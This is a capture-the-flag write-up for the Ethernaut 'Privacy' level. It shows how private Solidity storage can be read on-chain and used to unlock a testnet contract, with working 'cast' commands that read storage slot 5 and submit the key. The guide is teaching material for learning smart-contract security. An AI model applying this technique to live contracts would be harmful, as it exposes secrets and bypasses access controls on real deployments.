# Ethernaut Challenge 12 — Privacy

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Instance address:

```
0x7fFBF1444f2D487FF9b3240a774700352aA772e8
````

---

## 🎯 Goal

Unlock the contract by setting `locked = false`.

---

## 🧠 Thought process

Even though some variables are marked as `private`, **all contract storage is publicly readable on-chain**.

The `unlock` function checks:

```solidity
require(_key == bytes16(data[2]));
````

So we need to retrieve `data[2]` from storage and extract its first 16 bytes.

---

## 🧪 Step 1 — Understand storage layout

```solidity
bool public locked = true;                                // slot 0
uint256 public ID = block.timestamp;                      // slot 1  
uint8 private flattening = 10;                            // slot 2  
uint8 private denomination = 255;                         // slot 2  
uint16 private awkwardness = uint16(block.timestamp);     // slot 2
bytes32[3] private data;                                  // slots 3,4,5  
```

For the array:

```
data[0] → slot 3
data[1] → slot 4
data[2] → slot 5
```

👉 The key is stored in **slot 5**

---

## 🧪 Step 2 — Read storage

```bash
PRIVACY_SEPOLIA=0x7fFBF1444f2D487FF9b3240a774700352aA772e8
```

```bash
cast storage $PRIVACY_SEPOLIA 5 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0xbdb72375df87cf156e40b4ce5f01aa0a6e564e50f0f18c547896aa283600c1ae
```

---

## 🧪 Step 3 — Extract the key

The contract casts:

```solidity
bytes16(data[2])
```

👉 This takes the **first 16 bytes (leftmost)**

Using Chisel:

```solidity
bytes32 data = 0xbdb72375df87cf156e40b4ce5f01aa0a6e564e50f0f18c547896aa283600c1ae;
bytes16 data16 = bytes16(data);
```

Result:

```
0xbdb72375df87cf156e40b4ce5f01aa0a
```

---

## 🚀 Step 4 — Unlock the contract

```bash
cast send $PRIVACY_SEPOLIA \
    "unlock(bytes16)" 0xbdb72375df87cf156e40b4ce5f01aa0a \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0xd0503ee64fafdbda38a82c5a0b01ed115d6c991e86b8d3a7dd506459a71ed1d7
```

---

## ✅ Step 5 — Verify the result

```bash
cast call $PRIVACY_SEPOLIA \
    "locked()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
false
```

The contract is now unlocked.

---



